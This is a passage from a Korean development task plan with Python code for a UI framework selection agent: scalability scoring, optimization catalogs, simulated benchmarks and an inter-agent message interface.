            'patterns': ['component_composition', 'flux', 'micro_frontends'],
            'modularity': 0.9,
            'state_management_scalability': 0.8,
            'team_collaboration': 0.85,
            'splitting_capability': 0.9
        },
        'vue': {
            'patterns': ['component_based', 'vuex_modules', 'composition_api'],
            'modularity': 0.85,
            'state_management_scalability': 0.8,
            'team_collaboration': 0.8,
            'splitting_capability': 0.85
        },
        'angular': {
            'patterns': ['module_federation', 'lazy_loading', 'nx_monorepo'],
            'modularity': 0.95,
            'state_management_scalability': 0.85,
            'team_collaboration': 0.9,
            'splitting_capability': 0.95
        },
        'svelte': {
            'patterns': ['sveltekit', 'stores', 'component_modules'],
            'modularity': 0.7,
            'state_management_scalability': 0.7,
            'team_collaboration': 0.7,
            'splitting_capability': 0.75
        }
    }

    async def analyze_scalability(
        self,
        framework: str,
        project_requirements: Dict[str, Any]
    ) -> ScalabilityProfile:
        """프레임워크 확장성 분석"""

        # 1. 수평적 확장성 평가
        horizontal = await self._evaluate_horizontal_scalability(
            framework,
            project_requirements
        )

        # 2. 수직적 확장성 평가
        vertical = await self._evaluate_vertical_scalability(
            framework,
            project_requirements
        )

        # 3. 코드 모듈성 평가
        modularity = await self._evaluate_code_modularity(
            framework,
            project_requirements
        )

        # 4. 팀 확장성 평가
        team_scalability = await self._evaluate_team_scalability(
            framework,
            project_requirements
        )

        # 5. 데이터 흐름 효율성
        data_flow = await self._evaluate_data_flow_efficiency(
            framework,
            project_requirements
        )

        # 6. 병목 지점 식별
        bottlenecks = await self._identify_bottlenecks(
            framework,
            project_requirements
        )

        # 7. 확장 전략 수립
        strategies = await self._develop_scaling_strategies(
            framework,
            project_requirements,
            bottlenecks
        )

        return ScalabilityProfile(
            framework=framework,
            horizontal_scalability=horizontal,
            vertical_scalability=vertical,
            code_modularity=modularity,
            team_scalability=team_scalability,
            data_flow_efficiency=data_flow,
            architectural_patterns=self.SCALABILITY_PATTERNS[framework]['patterns'],
            bottlenecks=bottlenecks,
            scaling_strategies=strategies
        )

    async def _evaluate_horizontal_scalability(
        self,
        framework: str,
        requirements: Dict[str, Any]
    ) -> float:
        """수평적 확장성 평가 (기능 추가)"""

        base_score = self.SCALABILITY_PATTERNS[framework]['modularity']

        # 마이크로 프론트엔드 지원
        if 'micro_frontends' in self.SCALABILITY_PATTERNS[framework]['patterns']:
            base_score += 0.1

        # 독립적 배포 가능성
        if framework in ['react', 'angular']:
            base_score += 0.05

        # 프로젝트 규모에 따른 조정
        project_size = requirements.get('expected_modules', 10)
        if project_size > 50:
            # 대규모 프로젝트에서 모듈성이 더 중요
            if framework == 'angular':
                base_score += 0.1
            elif framework == 'svelte':
                base_score -= 0.1  # Svelte는 대규모 프로젝트에서 제한적

        return min(base_score, 1.0)

    async def _evaluate_vertical_scalability(
        self,
        framework: str,
        requirements: Dict[str, Any]
    ) -> float:
        """수직적 확장성 평가 (복잡도 증가)"""

        base_score = 0.7

        # 상태 관리 확장성
        state_complexity = requirements.get('state_complexity', 'medium')
        state_scores = {
            'low': 0.1,
            'medium': 0.0,
            'high': -0.1,
            'very_high': -0.2
        }

        base_score += state_scores.get(state_complexity, 0)

        # 프레임워크별 복잡도 처리 능력
        complexity_handling = {
            'react': 0.15,   # Redux, Context API 등
            'vue': 0.1,      # Vuex, Composition API
            'angular': 0.2,  # 강력한 구조와 DI
            'svelte': 0.0    # 간단하지만 대규모에서 제한적
        }

        base_score += complexity_handling.get(framework, 0)

        # 타입 시스템 지원
        if requirements.get('typescript', False):
            if framework == 'angular':
                base_score += 0.1  # Angular는 TypeScript 기본
            elif framework in ['react', 'vue']:
                base_score += 0.05

        return min(base_score, 1.0)

    async def _identify_bottlenecks(
        self,
        framework: str,
        requirements: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """확장성 병목 지점 식별"""

        bottlenecks = []

        # 1. 상태 관리 병목
        if requirements.get('state_complexity') == 'very_high':
            if framework == 'svelte':
                bottlenecks.append({
                    'type': 'state_management',
                    'severity': 'high',
                    'description': 'Svelte stores may not scale well for very complex state',
                    'impact': 'performance degradation with many reactive dependencies',
                    'mitigation': 'Consider external state management or splitting into smaller apps'
                })
            elif framework == 'react' and not requirements.get('state_library'):
                bottlenecks.append({
                    'type': 'state_management',
                    'severity': 'medium',
                    'description': 'Context API may cause unnecessary re-renders at scale',
                    'impact': 'performance issues with deeply nested components',
                    'mitigation': 'Implement Redux or Zustand for complex state'
                })

        # 2. 번들 크기 병목
        expected_components = requirements.get('component_count', 50)
        if expected_components > 200:
            if framework != 'svelte':  # Svelte는 컴파일 타임 최적화
                bottlenecks.append({
                    'type': 'bundle_size',
                    'severity': 'medium',
                    'description': 'Large bundle size with many components',
                    'impact': 'slow initial load times',
                    'mitigation': 'Implement aggressive code splitting and lazy loading'
                })

        # 3. 빌드 시간 병목
        if expected_components > 500:
            build_time_impact = {
                'angular': 'high',    # AOT 컴파일
                'vue': 'medium',
                'react': 'medium',
                'svelte': 'low'       # 빠른 컴파일
            }

            if build_time_impact.get(framework) in ['high', 'medium']:
                bottlenecks.append({
                    'type': 'build_performance',
                    'severity': build_time_impact[framework],
                    'description': 'Long build times with large codebase',
                    'impact': 'slower development iteration',
                    'mitigation': 'Use incremental builds, build caching, and parallel processing'
                })

        # 4. 팀 협업 병목
        team_size = requirements.get('team_size', 5)
        if team_size > 20:
            if framework == 'svelte':
                bottlenecks.append({
                    'type': 'team_collaboration',
                    'severity': 'medium',
                    'description': 'Limited tooling and patterns for large teams',
                    'impact': 'coordination challenges',
                    'mitigation': 'Establish strict conventions and consider monorepo tools'
                })

        return bottlenecks

    async def _develop_scaling_strategies(
        self,
        framework: str,
        requirements: Dict[str, Any],
        bottlenecks: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """확장 전략 개발"""

        strategies = []

        # 1. 아키텍처 패턴 전략
        if requirements.get('expected_growth') == 'high':
            if framework == 'react':
                strategies.append({
                    'name': 'Micro Frontend Architecture',
                    'description': 'Split app into independently deployable features',
                    'implementation': [
                        'Use Module Federation or single-spa',
                        'Define clear boundaries between micro apps',
                        'Implement shared component library',
                        'Set up independent CI/CD pipelines'
                    ],
                    'benefits': ['Independent deployment', 'Technology diversity', 'Team autonomy'],
                    'complexity': 'high'
                })
            elif framework == 'angular':
                strategies.append({
                    'name': 'Nx Monorepo Strategy',
                    'description': 'Use Nx for enterprise-scale Angular development',
                    'implementation': [
                        'Set up Nx workspace',
                        'Create libs for shared code',
                        'Implement computation caching',
                        'Use affected commands for selective builds'
                    ],
                    'benefits': ['Code sharing', 'Consistent tooling', 'Build optimization'],
                    'complexity': 'medium'
                })

        # 2. 성능 최적화 전략
        performance_critical = requirements.get('performance_critical', False)
        if performance_critical:
            strategies.append({
                'name': 'Progressive Enhancement Strategy',
                'description': 'Optimize for performance at scale',
                'implementation': [
                    'Implement virtual scrolling for large lists',
                    'Use web workers for heavy computations',
                    'Implement service worker caching',
                    'Use CDN for static assets'
                ],
                'benefits': ['Better performance', 'Improved UX', 'Reduced server load'],
                'complexity': 'medium'
            })

        # 3. 상태 관리 확장 전략
        if any(b['type'] == 'state_management' for b in bottlenecks):
            strategies.append({
                'name': 'Distributed State Management',
                'description': 'Scale state management for complex apps',
                'implementation': [
                    'Implement domain-driven state design',
                    'Use event sourcing for state changes',
                    'Implement state normalization',
                    'Add optimistic updates'
                ],
                'benefits': ['Predictable state', 'Better debugging', 'Improved performance'],
                'complexity': 'high'
            })

        return strategies
```

**확장성 매트릭스 생성**:

```python
async def create_scalability_matrix(
    self,
    frameworks: List[str],
    scenarios: List[Dict[str, Any]]
) -> Dict[str, Any]:
    """확장성 시나리오별 매트릭스 생성"""

    matrix = {}

    for scenario in scenarios:
        scenario_name = scenario['name']
        matrix[scenario_name] = {}

        for framework in frameworks:
            profile = await self.analyze_scalability(framework, scenario)

            # 종합 점수 계산
            overall_score = (
                profile.horizontal_scalability * 0.3 +
                profile.vertical_scalability * 0.25 +
                profile.code_modularity * 0.2 +
                profile.team_scalability * 0.15 +
                profile.data_flow_efficiency * 0.1
            )

            matrix[scenario_name][framework] = {
                'score': overall_score,
                'strengths': self._identify_scalability_strengths(profile),
                'challenges': [b['description'] for b in profile.bottlenecks],
                'recommended': overall_score > 0.7
            }

    return {
        'scalability_matrix': matrix,
        'best_frameworks_by_scenario': {
            scenario: max(
                frameworks,
                key=lambda f: matrix[scenario][f]['score']
            )
            for scenario in matrix
        }
    }
```

**검증 기준**:

- [ ] 수평/수직 확장성 평가
- [ ] 병목 지점 자동 식별
- [ ] 시나리오별 확장 전략
- [ ] 팀 규모별 권장사항

### SubTask 4.17.3: 최적화 전략 수립

**담당자**: 최적화 전문가  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/optimization_strategist.py
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum

@dataclass
class OptimizationStrategy:
    """최적화 전략"""
    name: str
    category: str  # performance, bundle, runtime, memory
    impact: str    # high, medium, low
    effort: str    # high, medium, low
    implementation_steps: List[str]
    expected_improvements: Dict[str, float]
    prerequisites: List[str]
    tools_required: List[str]

class OptimizationStrategist:
    """프레임워크별 최적화 전략 수립"""

    OPTIMIZATION_CATALOG = {
        'bundle_optimization': {
            'code_splitting': {
                'impact': 'high',
                'effort': 'medium',
                'improvements': {'bundle_size': -0.4, 'initial_load': -0.3},
                'tools': ['webpack', 'rollup', 'vite']
            },
            'tree_shaking': {
                'impact': 'high',
                'effort': 'low',
                'improvements': {'bundle_size': -0.3},
                'tools': ['webpack', 'rollup']
            },
            'lazy_loading': {
                'impact': 'high',
                'effort': 'medium',
                'improvements': {'initial_load': -0.4, 'memory': -0.2},
                'tools': ['react.lazy', 'vue-async', 'angular-lazy']
            },
            'compression': {
                'impact': 'medium',
                'effort': 'low',
                'improvements': {'bundle_size': -0.7, 'network': -0.7},
                'tools': ['gzip', 'brotli']
            }
        },
        'runtime_optimization': {
            'virtual_scrolling': {
                'impact': 'high',
                'effort': 'medium',
                'improvements': {'rendering': -0.8, 'memory': -0.6},
                'tools': ['react-window', 'vue-virtual-scroll', 'cdk-virtual']
            },
            'memoization': {
                'impact': 'medium',
                'effort': 'low',
                'improvements': {'cpu': -0.3, 'rendering': -0.2},
                'tools': ['react.memo', 'vue-computed', 'angular-pure-pipe']
            },
            'web_workers': {
                'impact': 'high',
                'effort': 'high',
                'improvements': {'cpu': -0.5, 'responsiveness': 0.4},
                'tools': ['comlink', 'workbox']
            }
        },
        'network_optimization': {
            'service_worker': {
                'impact': 'high',
                'effort': 'medium',
                'improvements': {'network': -0.8, 'offline': 1.0},
                'tools': ['workbox', 'pwa-builder']
            },
            'cdn_integration': {
                'impact': 'high',
                'effort': 'low',
                'improvements': {'network': -0.6, 'latency': -0.5},
                'tools': ['cloudflare', 'fastly', 'cloudfront']
            },
            'resource_hints': {
                'impact': 'medium',
                'effort': 'low',
                'improvements': {'initial_load': -0.2},
                'tools': ['preconnect', 'prefetch', 'preload']
            }
        }
    }

    async def develop_optimization_strategy(
        self,
        framework: str,
        performance_profile: PerformanceMetrics,
        requirements: Dict[str, Any]
    ) -> List[OptimizationStrategy]:
        """최적화 전략 개발"""

        # 1. 성능 병목 지점 분석
        bottlenecks = self._identify_performance_bottlenecks(
            performance_profile,
            requirements
        )

        # 2. 프레임워크별 최적화 기회 식별
        opportunities = await self._identify_optimization_opportunities(
            framework,
            bottlenecks,
            requirements
        )

        # 3. 우선순위 지정
        prioritized_strategies = self._prioritize_strategies(
            opportunities,
            requirements
        )

        # 4. 실행 계획 수립
        strategies = []
        for opportunity in prioritized_strategies[:10]:  # 상위 10개
            strategy = await self._create_detailed_strategy(
                opportunity,
                framework,
                requirements
            )
            strategies.append(strategy)

        return strategies

    def _identify_performance_bottlenecks(
        self,
        profile: PerformanceMetrics,
        requirements: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """성능 병목 지점 식별"""

        bottlenecks = []

        # 번들 크기 체크
        target_bundle_size = requirements.get('target_bundle_size', 200000)  # 200KB
        if profile.bundle_size > target_bundle_size:
            bottlenecks.append({
                'type': 'bundle_size',
                'severity': 'high' if profile.bundle_size > target_bundle_size * 2 else 'medium',
                'current': profile.bundle_size,
                'target': target_bundle_size,
                'impact_area': 'initial_load'
            })

        # 로딩 시간 체크
        target_load_time = requirements.get('target_load_time', 3000)  # 3s
        if profile.initial_load_time > target_load_time:
            bottlenecks.append({
                'type': 'loading_time',
                'severity': 'high',
                'current': profile.initial_load_time,
                'target': target_load_time,
                'impact_area': 'user_experience'
            })

        # 메모리 사용량 체크
        memory_limit = requirements.get('memory_limit', 100)  # 100MB
        peak_memory = max(profile.memory_usage.values())
        if peak_memory > memory_limit:
            bottlenecks.append({
                'type': 'memory_usage',
                'severity': 'medium',
                'current': peak_memory,
                'target': memory_limit,
                'impact_area': 'performance'
            })

        # 렌더링 성능 체크
        if profile.rendering_performance.get('fps', 60) < 30:
            bottlenecks.append({
                'type': 'rendering_performance',
                'severity': 'high',
                'current': profile.rendering_performance['fps'],
                'target': 60,
                'impact_area': 'user_experience'
            })

        return bottlenecks

    async def _create_detailed_strategy(
        self,
        opportunity: Dict[str, Any],
        framework: str,
        requirements: Dict[str, Any]
    ) -> OptimizationStrategy:
        """상세 최적화 전략 생성"""

        strategy_template = self.OPTIMIZATION_CATALOG[opportunity['category']][opportunity['technique']]

        # 프레임워크별 구현 단계
        implementation_steps = self._get_framework_specific_steps(
            framework,
            opportunity['technique']
        )

        # 필수 조건 확인
        prerequisites = self._identify_prerequisites(
            framework,
            opportunity['technique']
        )

        # 도구 선택
        tools = self._select_tools_for_framework(
            framework,
            strategy_template['tools']
        )

        return OptimizationStrategy(
            name=f"{opportunity['technique'].replace('_', ' ').title()} for {framework}",
            category=opportunity['category'],
            impact=strategy_template['impact'],
            effort=strategy_template['effort'],
            implementation_steps=implementation_steps,
            expected_improvements=strategy_template['improvements'],
            prerequisites=prerequisites,
            tools_required=tools
        )

    def _get_framework_specific_steps(
        self,
        framework: str,
        technique: str
    ) -> List[str]:
        """프레임워크별 구현 단계"""

        steps_map = {
            ('react', 'code_splitting'): [
                'Install @loadable/component or use React.lazy',
                'Identify routes for splitting',
                'Wrap components with lazy loading',
                'Add Suspense boundaries with fallbacks',
                'Configure webpack for dynamic imports',
                'Test loading states and error boundaries'
            ],
            ('react', 'virtual_scrolling'): [
                'Install react-window or react-virtualized',
                'Replace large lists with FixedSizeList/VariableSizeList',
                'Implement item renderer components',
                'Add scroll position restoration',
                'Optimize item components with React.memo',
                'Test with large datasets'
            ],
            ('vue', 'code_splitting'): [
                'Use defineAsyncComponent for components',
                'Configure vue-router for lazy loading',
                'Set up webpack magic comments',
                'Add loading and error components',
                'Implement prefetching strategy',
                'Monitor chunk sizes'
            ],
            ('angular', 'lazy_loading'): [
                'Create feature modules',
                'Configure lazy routes in RouterModule',
                'Use loadChildren with dynamic imports',
                'Implement preloading strategy',
                'Add route guards if needed',
                'Verify with webpack bundle analyzer'
            ]
        }

        key = (framework, technique)
        return steps_map.get(key, [
            f'Analyze current {technique} usage',
            f'Implement {technique} for {framework}',
            'Measure performance improvements',
            'Monitor for regressions'
        ])
```

**최적화 로드맵 생성**:

```python
async def create_optimization_roadmap(
    self,
    framework: str,
    current_metrics: PerformanceMetrics,
    target_metrics: Dict[str, float],
    timeline: int  # weeks
) -> Dict[str, Any]:
    """단계별 최적화 로드맵 생성"""

    strategies = await self.develop_optimization_strategy(
        framework,
        current_metrics,
        {'targets': target_metrics}
    )

    # 단계별 그룹화
    phases = self._group_strategies_into_phases(strategies)

    # 타임라인 할당
    phase_timeline = self._allocate_timeline(phases, timeline)

    # 예상 개선 사항 계산
    cumulative_improvements = self._calculate_cumulative_improvements(
        phases,
        current_metrics
    )

    return {
        'roadmap': {
            'framework': framework,
            'total_duration': timeline,
            'phases': [
                {
                    'number': i + 1,
                    'name': phase['name'],
                    'duration': phase_timeline[i],
                    'strategies': phase['strategies'],
                    'expected_metrics': cumulative_improvements[i],
                    'success_criteria': self._define_success_criteria(
                        phase['strategies']
                    )
                }
                for i, phase in enumerate(phases)
            ]
        },
        'expected_final_metrics': cumulative_improvements[-1],
        'risk_factors': self._identify_optimization_risks(strategies),
        'monitoring_plan': self._create_monitoring_plan(phases)
    }

def _calculate_roi(
    self,
    strategy: OptimizationStrategy,
    current_metrics: PerformanceMetrics
) -> float:
    """최적화 ROI 계산"""

    # 예상 개선율
    improvements = strategy.expected_improvements

    # 비즈니스 영향 계산
    business_impact = 0.0

    # 번들 크기 감소 -> 사용자 유지율 증가
    if 'bundle_size' in improvements:
        size_reduction = abs(improvements['bundle_size'])
        business_impact += size_reduction * 0.3  # 30% 가중치

    # 로딩 시간 감소 -> 전환율 증가
    if 'initial_load' in improvements:
        load_reduction = abs(improvements['initial_load'])
        business_impact += load_reduction * 0.5  # 50% 가중치

    # 노력 대비 효과
    effort_scores = {'low': 1.0, 'medium': 0.6, 'high': 0.3}
    effort_factor = effort_scores.get(strategy.effort, 0.5)

    return business_impact * effort_factor
```

**검증 기준**:

- [ ] 병목 지점 자동 감지
- [ ] 프레임워크별 최적화 기법
- [ ] ROI 기반 우선순위
- [ ] 단계별 실행 계획

### SubTask 4.17.4: 벤치마크 비교 시스템

**담당자**: 성능 분석가  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/benchmark_comparison_system.py
from typing import Dict, List, Optional, Any, Tuple
import asyncio
from datetime import datetime
import statistics

@dataclass
class BenchmarkResult:
    """벤치마크 결과"""
    framework: str
    test_name: str
    metrics: Dict[str, float]
    environment: Dict[str, str]
    timestamp: datetime
    iterations: int
    variance: Dict[str, float]

class BenchmarkComparisonSystem:
    """프레임워크 벤치마크 비교 시스템"""

    BENCHMARK_SUITES = {
        'rendering': {
            'tests': [
                'initial_render',
                'update_1000_items',
                'add_remove_items',
                'deep_tree_render',
                'complex_state_update'
            ],
            'metrics': ['time', 'fps', 'memory', 'cpu']
        },
        'bundle': {
            'tests': [
                'minimal_app',
                'real_world_app',
                'with_routing',
                'with_state_management',
                'with_ui_library'
            ],
            'metrics': ['size', 'gzipped_size', 'parse_time', 'compile_time']
        },
        'runtime': {
            'tests': [
                'dom_manipulation',
                'event_handling',
                'state_updates',
                'computed_values',
                'watchers_effects'
            ],
            'metrics': ['execution_time', 'memory_delta', 'gc_count']
        },
        'developer_experience': {
            'tests': [
                'hot_reload_time',
                'build_time',
                'test_execution',
                'type_checking',
                'lint_time'
            ],
            'metrics': ['time', 'success_rate', 'error_clarity']
        }
    }

    async def run_benchmarks(
        self,
        frameworks: List[str],
        test_suites: List[str],
        iterations: int = 10
    ) -> Dict[str, List[BenchmarkResult]]:
        """벤치마크 실행"""

        results = {}

        for framework in frameworks:
            results[framework] = []

            for suite in test_suites:
                suite_config = self.BENCHMARK_SUITES.get(suite)
                if not suite_config:
                    continue

                for test in suite_config['tests']:
                    result = await self._run_single_benchmark(
                        framework,
                        suite,
                        test,
                        suite_config['metrics'],
                        iterations
                    )
                    results[framework].append(result)

        return results

    async def _run_single_benchmark(
        self,
        framework: str,
        suite: str,
        test: str,
        metrics: List[str],
        iterations: int
    ) -> BenchmarkResult:
        """단일 벤치마크 실행"""

        # 환경 정보 수집
        environment = self._collect_environment_info()

        # 여러 번 실행하여 평균값 계산
        all_results = []

        for _ in range(iterations):
            test_result = await self._execute_benchmark_test(
                framework,
                suite,
                test,
                metrics
            )
            all_results.append(test_result)

            # 테스트 간 쿨다운
            await asyncio.sleep(0.5)

        # 결과 집계
        aggregated_metrics = {}
        variance_metrics = {}

        for metric in metrics:
            values = [r[metric] for r in all_results if metric in r]
            if values:
                aggregated_metrics[metric] = statistics.mean(values)
                variance_metrics[metric] = statistics.stdev(values) if len(values) > 1 else 0

        return BenchmarkResult(
            framework=framework,
            test_name=f"{suite}.{test}",
            metrics=aggregated_metrics,
            environment=environment,
            timestamp=datetime.now(),
            iterations=iterations,
            variance=variance_metrics
        )

    async def _execute_benchmark_test(
        self,
        framework: str,
        suite: str,
        test: str,
        metrics: List[str]
    ) -> Dict[str, float]:
        """벤치마크 테스트 실행"""

        if suite == 'rendering':
            return await self._run_rendering_benchmark(framework, test)
        elif suite == 'bundle':
            return await self._run_bundle_benchmark(framework, test)
        elif suite == 'runtime':
            return await self._run_runtime_benchmark(framework, test)
        elif suite == 'developer_experience':
            return await self._run_dx_benchmark(framework, test)

        return {}

    async def _run_rendering_benchmark(
        self,
        framework: str,
        test: str
    ) -> Dict[str, float]:
        """렌더링 벤치마크 실행"""

        # 시뮬레이션된 벤치마크 결과
        base_times = {
            'react': {'initial_render': 45, 'update_1000_items': 120},
            'vue': {'initial_render': 38, 'update_1000_items': 110},
            'angular': {'initial_render': 65, 'update_1000_items': 130},
            'svelte': {'initial_render': 25, 'update_1000_items': 80}
        }

        framework_base = base_times.get(framework, {})
        base_time = framework_base.get(test, 50)

        # 약간의 변동성 추가
        import random
        variance = random.uniform(0.9, 1.1)

        return {
            'time': base_time * variance,
            'fps': 60 / (base_time * variance / 1000),
            'memory': base_time * 0.5 * variance,
            'cpu': min(100, base_time * 0.8 * variance)
        }

    async def create_comparison_report(
        self,
        benchmark_results: Dict[str, List[BenchmarkResult]],
        weights: Optional[Dict[str, float]] = None
    ) -> Dict[str, Any]:
        """벤치마크 비교 보고서 생성"""

        # 기본 가중치
        if not weights:
            weights = {
                'rendering': 0.3,
                'bundle': 0.3,
                'runtime': 0.25,
                'developer_experience': 0.15
            }

        # 프레임워크별 점수 계산
        framework_scores = {}
        detailed_comparisons = {}

        for framework, results in benchmark_results.items():
            scores_by_suite = {}

            for result in results:
                suite = result.test_name.split('.')[0]
                if suite not in scores_by_suite:
                    scores_by_suite[suite] = []

                # 정규화된 점수 계산
                normalized_score = self._normalize_benchmark_score(
                    result,
                    benchmark_results
                )
                scores_by_suite[suite].append(normalized_score)

            # 가중 평균 계산
            weighted_score = 0
            for suite, scores in scores_by_suite.items():
                suite_avg = statistics.mean(scores) if scores else 0
                weighted_score += suite_avg * weights.get(suite, 0.25)

            framework_scores[framework] = weighted_score
            detailed_comparisons[framework] = scores_by_suite

        # 순위 매기기
        rankings = sorted(
            framework_scores.items(),
            key=lambda x: x[1],
            reverse=True
        )

        return {
            'overall_rankings': rankings,
            'framework_scores': framework_scores,
            'detailed_comparisons': detailed_comparisons,
            'suite_winners': self._identify_suite_winners(benchmark_results),
            'performance_insights': self._generate_insights(
                benchmark_results,
                rankings
            ),
            'recommendation': self._generate_recommendation(
                rankings,
                detailed_comparisons
            )
        }

    def _generate_insights(
        self,
        results: Dict[str, List[BenchmarkResult]],
        rankings: List[Tuple[str, float]]
    ) -> List[str]:
        """벤치마크 인사이트 생성"""

        insights = []

        # 전체 우승자
        winner = rankings[0][0]
        insights.append(
            f"{winner.title()} achieved the highest overall performance score"
        )

        # 카테고리별 분석
        suite_analysis = {}
        for framework, results_list in results.items():
            for result in results_list:
                suite = result.test_name.split('.')[0]
                if suite not in suite_analysis:
                    suite_analysis[suite] = {}
                if framework not in suite_analysis[suite]:
                    suite_analysis[suite][framework] = []

                # 주요 메트릭 수집
                key_metric = list(result.metrics.keys())[0] if result.metrics else None
                if key_metric:
                    suite_analysis[suite][framework].append(result.metrics[key_metric])

        # 카테고리별 인사이트
        for suite, framework_data in suite_analysis.items():
            best_framework = min(
                framework_data.items(),
                key=lambda x: statistics.mean(x[1]) if x[1] else float('inf')
            )[0]

            insights.append(
                f"{best_framework.title()} excels in {suite} benchmarks"
            )

        # 특별한 발견사항
        if 'svelte' in results:
            svelte_bundle_scores = [
                r.metrics.get('size', float('inf'))
                for r in results['svelte']
                if 'bundle' in r.test_name
            ]
            if svelte_bundle_scores and min(svelte_bundle_scores) < 20000:
                insights.append(
                    "Svelte produces exceptionally small bundle sizes due to compile-time optimization"
                )

        return insights

    def _generate_recommendation(
        self,
        rankings: List[Tuple[str, float]],
        detailed_comparisons: Dict[str, Dict[str, List[float]]]
    ) -> Dict[str, Any]:
        """프레임워크 추천 생성"""

        recommendations = {
            'performance_critical': None,
            'bundle_size_critical': None,
            'developer_experience': None,
            'balanced': rankings[0][0]
        }

        # 성능 중심 추천
        perf_scores = {}
        for framework, comparisons in detailed_comparisons.items():
            if 'rendering' in comparisons and 'runtime' in comparisons:
                perf_scores[framework] = (
                    statistics.mean(comparisons['rendering']) * 0.6 +
                    statistics.mean(comparisons['runtime']) * 0.4
                )

        if perf_scores:
            recommendations['performance_critical'] = max(
                perf_scores.items(),
                key=lambda x: x[1]
            )[0]

        # 번들 크기 중심 추천
        bundle_scores = {}
        for framework, comparisons in detailed_comparisons.items():
            if 'bundle' in comparisons:
                bundle_scores[framework] = statistics.mean(comparisons['bundle'])

        if bundle_scores:
            recommendations['bundle_size_critical'] = max(
                bundle_scores.items(),
                key=lambda x: x[1]
            )[0]

        # 개발자 경험 중심 추천
        dx_scores = {}
        for framework, comparisons in detailed_comparisons.items():
            if 'developer_experience' in comparisons:
                dx_scores[framework] = statistics.mean(comparisons['developer_experience'])

        if dx_scores:
            recommendations['developer_experience'] = max(
                dx_scores.items(),
                key=lambda x: x[1]
            )[0]

        return recommendations
```

**벤치마크 시각화**:

```python
def create_benchmark_visualization_data(
    self,
    comparison_report: Dict[str, Any]
) -> Dict[str, Any]:
    """벤치마크 시각화 데이터 생성"""

    return {
        'radar_chart': {
            'categories': ['Rendering', 'Bundle Size', 'Runtime', 'DX'],
            'series': [
                {
                    'name': framework,
                    'data': [
                        comparisons.get('rendering', [0])[0] if comparisons.get('rendering') else 0,
                        comparisons.get('bundle', [0])[0] if comparisons.get('bundle') else 0,
                        comparisons.get('runtime', [0])[0] if comparisons.get('runtime') else 0,
                        comparisons.get('developer_experience', [0])[0] if comparisons.get('developer_experience') else 0
                    ]
                }
                for framework, comparisons in comparison_report['detailed_comparisons'].items()
            ]
        },
        'bar_chart': {
            'categories': [fw for fw, _ in comparison_report['overall_rankings']],
            'series': [{
                'name': 'Overall Score',
                'data': [score for _, score in comparison_report['overall_rankings']]
            }]
        },
        'performance_matrix': self._create_performance_matrix(
            comparison_report['detailed_comparisons']
        )
    }
```

**검증 기준**:

- [ ] 4개 벤치마크 카테고리
- [ ] 자동화된 테스트 실행
- [ ] 통계적 분석 포함
- [ ] 시각화 데이터 생성

## Task 4.18: UI Agent 통합 인터페이스

### SubTask 4.18.1: 다른 에이전트와의 통신 프로토콜

**담당자**: 통합 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:```python

# backend/src/agents/implementations/ui_selection/agent_communication_interface.py

from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass
from datetime import datetime
import asyncio
import json
from abc import ABC, abstractmethod

@dataclass
class UIAgentMessage:
"""UI Agent 전용 메시지 포맷"""
message_id: str
source_agent: str
target_agent: str
message_type: str
payload: Dict[str, Any]
correlation_id: str
timestamp: datetime
priority: str = 'normal'
reply_to: Optional[str] = None

class UIAgentCommunicationInterface:
"""UI Selection Agent 통신 인터페이스"""

    def __init__(self, agent_id: str, message_bus: Any):
        self.agent_id = agent_id
        self.message_bus = message_bus
        self.message_handlers = {}
        self.response_callbacks = {}
        self.protocol_version = "1.0"

    async def initialize_communication(self):
        """통신 채널 초기화"""

        # UI Agent 전용 채널 구독
        channels = [
            f'agent:{self.agent_id}',
            'agent:ui_selection:broadcast',
            'workflow:ui_framework_selection'
        ]

        for channel in channels:
            await self.message_bus.subscribe(
                channel,
                self._handle_incoming_message
            )

        # 다른 에이전트와의 연결 설정
        await self._establish_agent_connections()

    async def _establish_agent_connections(self):
        """다른 에이전트와의 연결 설정"""

        agent_connections = {
            'nl_input_agent': {
                'channels': ['nl_input:parsed'],
                'message_types': ['natural_language_parsed', 'intent_analyzed']
            },
            'parser_agent': {
                'channels': ['parser:requirements_extracted'],
                'message_types': ['requirements_parsed', 'metadata_extracted']
            },
            'component_decision_agent': {
                'channels': ['ui_selection:framework_selected'],
                'message_types': ['framework_recommendation', 'component_requirements']
            },
            'generation_agent': {
                'channels': ['ui_selection:framework_config'],
                'message_types': ['framework_setup', 'boilerplate_config']
            }
        }

        for agent, config in agent_connections.items():
            for channel in config['channels']:
                await self.message_bus.subscribe(
                    channel,
                    lambda msg: self._handle_agent_message(agent, msg)
                )

    async def send_to_agent(
        self,
        target_agent: str,
        message_type: str,
        payload: Dict[str, Any],
        correlation_id: Optional[str] = None,
        priority: str = 'normal'
    ) -> str:
        """다른 에이전트로 메시지 전송"""

        import uuid

        message = UIAgentMessage(
            message_id=str(uuid.uuid4()),
            source_agent='ui_selection_agent',
            target_agent=target_agent,
            message_type=message_type,
            payload=payload,
            correlation_id=correlation_id or str(uuid.uuid4()),
            timestamp=datetime.utcnow(),
            priority=priority
        )

        # 메시지 변환 및 검증
        validated_message = await self._validate_outgoing_message(
            message,
            target_agent
        )

        # 대상 에이전트별 채널 선택
        channel = self._get_target_channel(target_agent, message_type)

        # 메시지 전송
        await self.message_bus.publish(channel, validated_message)

        # 응답 대기가 필요한 경우
        if message_type.endswith('_request'):
            return await self._wait_for_response(
                message.message_id,
                timeout=30
            )

        return message.message_id

    async def _validate_outgoing_message(
        self,
        message: UIAgentMessage,
        target_agent: str
    ) -> Dict[str, Any]:
        """발신 메시지 검증 및 변환"""

        # 대상 에이전트별 프로토콜 요구사항
        protocol_requirements = {
            'component_decision_agent': {
                'required_fields': ['framework', 'confidence_score', 'reasoning'],
                'format': 'structured_recommendation'
            },
            'generation_agent': {
                'required_fields': ['framework', 'config', 'dependencies'],
                'format': 'framework_specification'
            }
        }

        requirements = protocol_requirements.get(target_agent, {})

        # 필수 필드 검증
        if 'required_fields' in requirements:
            for field in requirements['required_fields']:
                if field not in message.payload:
